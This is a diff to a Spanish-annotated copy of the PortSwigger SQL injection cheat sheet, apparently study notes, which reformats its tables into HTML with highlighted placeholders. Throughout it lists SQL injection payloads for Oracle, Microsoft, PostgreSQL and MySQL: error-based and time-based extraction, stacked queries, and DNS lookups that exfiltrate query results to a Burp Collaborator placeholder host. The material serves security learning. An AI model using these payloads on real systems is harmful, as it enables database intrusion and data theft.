@@ -4,116 +4,129 @@
 > Fuente: <https://portswigger.net/web-security/sql-injection/cheat-sheet>
 > Volver al punto de entrada: [README.md](README.md) · Labs: [labs/README.md](labs/README.md)
 
+> [!note] 🟡 Cómo leer el resaltado
+> Lo que está <mark>resaltado</mark> es lo que **reemplazás vos**: tu consulta (`YOUR-QUERY-HERE`), tu condición (`YOUR-CONDITION-HERE`), el nombre de tabla (`TABLE-NAME-HERE`) o tu subdominio de Burp Collaborator (`BURP-COLLABORATOR-SUBDOMAIN`).
+
 This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
 
 ## String concatenation
 
 You can concatenate together multiple strings to make a single string.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `'foo'\|\|'bar'` |
-| Microsoft | `'foo'+'bar'` |
-| PostgreSQL | `'foo'\|\|'bar'` |
-| MySQL | `'foo' 'bar'` (nota el espacio entre las dos cadenas)<br>`CONCAT('foo','bar')` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>'foo'||'bar'</code></td></tr>
+<tr><td>Microsoft</td><td><code>'foo'+'bar'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>'foo'||'bar'</code></td></tr>
+<tr><td>MySQL</td><td><code>'foo' 'bar'</code> (nota el espacio entre las dos cadenas)<br><code>CONCAT('foo','bar')</code></td></tr>
+</table>
 
 ## Substring
 
 You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `SUBSTR('foobar', 4, 2)` |
-| Microsoft | `SUBSTRING('foobar', 4, 2)` |
-| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
-| MySQL | `SUBSTRING('foobar', 4, 2)` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>SUBSTR('foobar', 4, 2)</code></td></tr>
+<tr><td>Microsoft</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+<tr><td>MySQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+</table>
 
 ## Comments
 
 You can use comments to truncate a query and remove the portion of the original query that follows your input.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `--comment` |
-| Microsoft | `--comment`<br>`/*comment*/` |
-| PostgreSQL | `--comment`<br>`/*comment*/` |
-| MySQL | `#comment`<br>`-- comment` (nota el espacio tras el doble guion)<br>`/*comment*/` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>--comment</code></td></tr>
+<tr><td>Microsoft</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
+<tr><td>MySQL</td><td><code>#comment</code><br><code>-- comment</code> (nota el espacio tras el doble guion)<br><code>/*comment*/</code></td></tr>
+</table>
 
 ## Database version
 
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
-| Microsoft | `SELECT @@version` |
-| PostgreSQL | `SELECT version()` |
-| MySQL | `SELECT @@version` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td></tr>
+<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr>
+</table>
 
 ## Database contents
 
 You can list the tables that exist in the database, and the columns that those tables contain.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| Microsoft | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| PostgreSQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| MySQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
+<tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = '<mark>TABLE-NAME-HERE</mark>'</code></td></tr>
+</table>
 
 ## Conditional errors
 
 You can test a single boolean condition and trigger a database error if the condition is true.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
-| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
-| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
-| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td></tr>
+<tr><td>Microsoft</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 1/0 ELSE NULL END</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>1 = (SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 1/(SELECT 0) ELSE NULL END)</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT IF(<mark>YOUR-CONDITION-HERE</mark>,(SELECT table_name FROM information_schema.tables),'a')</code></td></tr>
+</table>
 
 ## Extracting data via visible error messages
 
 You can potentially elicit error messages that leak sensitive data returned by your malicious query.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>→ `Conversion failed when converting the varchar value 'secret' to data type int.` |
-| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>→ `invalid input syntax for integer: "secret"` |
-| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>→ `XPATH syntax error: '\secret'` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Microsoft</td><td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br>↳ <code>Conversion failed when converting the varchar value 'secret' to data type int.</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br>↳ <code>invalid input syntax for integer: "secret"</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br>↳ <code>XPATH syntax error: '\secret'</code></td></tr>
+</table>
 
 ## Batched (or stacked) queries
 
 You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | Does not support batched queries. |
-| Microsoft | `QUERY-1-HERE; QUERY-2-HERE`<br>`QUERY-1-HERE QUERY-2-HERE` |
-| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
-| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td>Does not support batched queries.</td></tr>
+<tr><td>Microsoft</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code><br><code><mark>QUERY-1-HERE</mark> <mark>QUERY-2-HERE</mark></code></td></tr>
+<tr><td>PostgreSQL</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code></td></tr>
+<tr><td>MySQL</td><td><code><mark>QUERY-1-HERE</mark>; <mark>QUERY-2-HERE</mark></code></td></tr>
+</table>
 
 ## Time delays
 
 You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `dbms_pipe.receive_message(('a'),10)` |
-| Microsoft | `WAITFOR DELAY '0:0:10'` |
-| PostgreSQL | `SELECT pg_sleep(10)` |
-| MySQL | `SELECT SLEEP(10)` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr>
+<tr><td>Microsoft</td><td><code>WAITFOR DELAY '0:0:10'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT pg_sleep(10)</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr>
+</table>
 
 ## Conditional time delays
 
 You can test a single boolean condition and trigger a time delay if the condition is true.
 
-| Motor | Sintaxis |
-|-------|----------|
-| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
-| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
-| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
-| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |
+<table>
+<tr><th>Motor</th><th>Sintaxis</th></tr>
+<tr><td>Oracle</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td></tr>
+<tr><td>Microsoft</td><td><code>IF (<mark>YOUR-CONDITION-HERE</mark>) WAITFOR DELAY '0:0:10'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT CASE WHEN (<mark>YOUR-CONDITION-HERE</mark>) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT IF(<mark>YOUR-CONDITION-HERE</mark>,SLEEP(10),'a')</code></td></tr>
+</table>
 
 ## DNS lookup
 
@@ -121,34 +134,24 @@ You can cause the database to perform a DNS lookup to an external domain. To do 
 
 **Oracle** — The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
 
-```sql
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-```
+<pre><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/"&gt; %remote;]&gt;'),'/l') FROM dual</code></pre>
 
 The following technique works on fully patched Oracle installations, but requires elevated privileges:
 
-```sql
-SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
-```
+<pre><code>SELECT UTL_INADDR.get_host_address('<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>')</code></pre>
 
 **Microsoft**
 
-```sql
-exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
-```
+<pre><code>exec master..xp_dirtree '//<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a'</code></pre>
 
 **PostgreSQL**
 
-```sql
-copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
-```
+<pre><code>copy (SELECT '') to program 'nslookup <mark>BURP-COLLABORATOR-SUBDOMAIN</mark>'</code></pre>
 
 **MySQL** — The following techniques work on Windows only:
 
-```sql
-LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
-SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
-```
+<pre><code>LOAD_FILE('\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\\a')
+SELECT ... INTO OUTFILE '\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\a'</code></pre>
 
 ## DNS lookup with data exfiltration
 
@@ -156,33 +159,25 @@ You can cause the database to perform a DNS lookup to an external domain contain
 
 **Oracle**
 
-```sql
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-```
+<pre><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT <mark>YOUR-QUERY-HERE</mark>)||'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/"&gt; %remote;]&gt;'),'/l') FROM dual</code></pre>
 
 **Microsoft**
 
-```sql
-declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
-```
+<pre><code>declare @p varchar(1024);set @p=(SELECT <mark>YOUR-QUERY-HERE</mark>);exec('master..xp_dirtree "//'+@p+'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a"')</code></pre>
 
 **PostgreSQL**
 
-```sql
-create OR replace function f() returns void as $$
+<pre><code>create OR replace function f() returns void as $$
 declare c text;
 declare p text;
 begin
-SELECT into p (SELECT YOUR-QUERY-HERE);
-c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+SELECT into p (SELECT <mark>YOUR-QUERY-HERE</mark>);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>''';
 execute c;
 END;
 $$ language plpgsql security definer;
-SELECT f();
-```
+SELECT f();</code></pre>
 
 **MySQL** — The following technique works on Windows only:
 
-```sql
-SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
-```
+<pre><code>SELECT <mark>YOUR-QUERY-HERE</mark> INTO OUTFILE '\\\\<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>\a'</code></pre>
